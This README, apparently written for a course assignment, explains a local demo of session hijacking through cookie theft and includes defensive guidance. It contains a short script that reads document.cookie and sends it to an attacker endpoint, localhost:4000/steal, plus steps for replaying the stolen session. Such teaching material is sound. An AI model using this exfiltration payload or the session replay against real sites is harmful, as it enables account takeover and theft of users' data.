# Session Hijacking via XSS — Information Security Assignment

## Overview

This project demonstrates a **Session ID Theft attack using Cross-Site Scripting (XSS)**.
It consists of two Node.js servers that simulate a real-world attack scenario where an
attacker steals a victim's authenticated session cookie and uses it to impersonate them
— without ever knowing their password.

---

## Architecture

```
┌──────────────────────┐         ┌──────────────────────┐
│   LEGITIMATE SERVER  │         │   ATTACKER SERVER    │
│   localhost:3000     │         │   localhost:4000     │
│                      │         │                      │
│  • Login page        │         │  • Malicious page    │
│  • Issues session    │         │  • XSS payload       │
│    cookie (no        │         │  • /steal endpoint   │
│    HttpOnly!)        │         │  • Stolen sessions   │
│  • Dashboard         │         │    dashboard         │
│  • /profile API      │         │                      │
└──────────────────────┘         └──────────────────────┘
```

---

## The Attack Flow

```
Step 1: Client visits Legitimate Server (port 3000)
        → Logs in with username/password
        → Server issues: Set-Cookie: session_id=abc123  ← NO HttpOnly flag!

Step 2: Client visits Attacker's Server (port 4000)
        → Page loads → XSS payload fires immediately
        → Script runs: var stolen = document.cookie;
        → stolen = "session_id=abc123"

Step 3: Attacker's script exfiltrates cookie
        → fetch('http://localhost:4000/steal?cookies=session_id=abc123')
        → Attacker's /steal endpoint receives and stores the session ID

Step 4: Attacker uses stolen session
        → GET http://localhost:3000/profile?session=abc123
        → Legitimate Server validates session ID → returns account data
        → Attacker is now authenticated as the victim, NO PASSWORD NEEDED
```

---

## Why This Attack Works

The root cause is a **missing `HttpOnly` flag** on the session cookie.

| Cookie Flag | What It Does                                       | This Demo  |
| ----------- | -------------------------------------------------- | ---------- |
| `HttpOnly`  | Prevents JavaScript from reading `document.cookie` | ❌ MISSING |
| `Secure`    | Sends cookie only over HTTPS                       | ❌ MISSING |
| `SameSite`  | Prevents cross-site request forgery                | ⚠️ Partial |

The legitimate server sets the cookie as:

```
Set-Cookie: session_id=abc123; Path=/; SameSite=None
```

A **secure** implementation would be:

```
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Strict
```

---

## File Structure

```
xss-assignment/
├── legitimate-server/
│   ├── package.json
│   └── server.js          ← Login, session management, dashboard
│
├── attacker-server/
│   ├── package.json
│   └── server.js          ← Malicious page, /steal endpoint
│
└── README.md
```

---

## How to Run

### Prerequisites

- Node.js v14 or higher
- npm

### Terminal 1 — Start the Legitimate Server

```bash
cd legitimate-server
npm install
node server.js
```

Output:

```
🏦 LEGITIMATE SERVER running at http://localhost:3000
```

### Terminal 2 — Start the Attacker Server

```bash
cd attacker-server
npm install
node server.js
```

Output:

```
💀 ATTACKER SERVER running at http://localhost:4000
```

---

## Performing the Attack (Step by Step)

### Step 1 — Victim Logs In

1. Open your browser and go to **http://localhost:3000**
2. Log in with: `alice` / `password123`
3. You are redirected to the dashboard — your `session_id` cookie is now set
4. Note the session ID shown on the dashboard

### Step 2 — Victim Visits Malicious Site

1. In the **same browser**, navigate to **http://localhost:4000**
2. The page appears to be a prize-claim website (social engineering)
3. On page load, the hidden XSS payload automatically executes:
   - Reads `document.cookie` (works because `HttpOnly` is absent)
   - Sends the cookie to `http://localhost:4000/steal`
   - Uses the stolen session to call `http://localhost:3000/profile`

### Step 3 — View Attacker's Loot

1. Visit **http://localhost:4000/stolen-sessions**
2. You will see the stolen session ID listed
3. Click "Use to Access Account →" to see the attacker accessing victim data

### Step 4 — Direct API Exploitation

The attacker can also directly access protected data:

```
GET http://localhost:3000/profile?session=<stolen_session_id>
```

This returns full account information without any login.

---

## Key Code Snippets

### The Vulnerability (Legitimate Server)

```javascript
// INSECURE — missing HttpOnly, Secure, and proper SameSite
res.setHeader("Set-Cookie", `session_id=${sessionId}; Path=/; SameSite=None`);
```

### The XSS Payload (Attacker's Page)

```javascript
// Step 1: Read cookies — only possible because HttpOnly is absent
var stolenCookies = document.cookie;

// Step 2: Exfiltrate to attacker server
fetch(
  "http://localhost:4000/steal?cookies=" + encodeURIComponent(stolenCookies),
);
```

### The Fix

```javascript
// SECURE — HttpOnly prevents JavaScript from reading this cookie
res.setHeader(
  "Set-Cookie",
  `session_id=${sessionId}; Path=/; HttpOnly; Secure; SameSite=Strict`,
);
```

---

## Defenses Against Session Hijacking via XSS

| Defense                           | Description                                                     |
| --------------------------------- | --------------------------------------------------------------- |
| **HttpOnly cookie flag**          | Prevents JS from reading cookies — direct mitigation            |
| **Secure cookie flag**            | Ensures cookie only sent over HTTPS                             |
| **SameSite=Strict**               | Prevents cookie being sent on cross-origin requests             |
| **Content Security Policy (CSP)** | Blocks inline scripts and unauthorized fetch destinations       |
| **Input sanitization**            | Prevents XSS payloads being stored/reflected in the first place |
| **Session binding**               | Bind session to IP address or User-Agent fingerprint            |
| **Short session TTL**             | Expire sessions quickly to limit window of exploitation         |
| **Token rotation**                | Issue new session token on each request                         |

---

## Demo Credentials

| Username | Password    |
| -------- | ----------- |
| alice    | password123 |
| bob      | securepass  |

---

## Important Note

This project is created **strictly for educational purposes** as part of an Information
Security course assignment. All attacks are demonstrated in a local, isolated environment.
Never use these techniques against systems you do not own or have explicit permission to test.
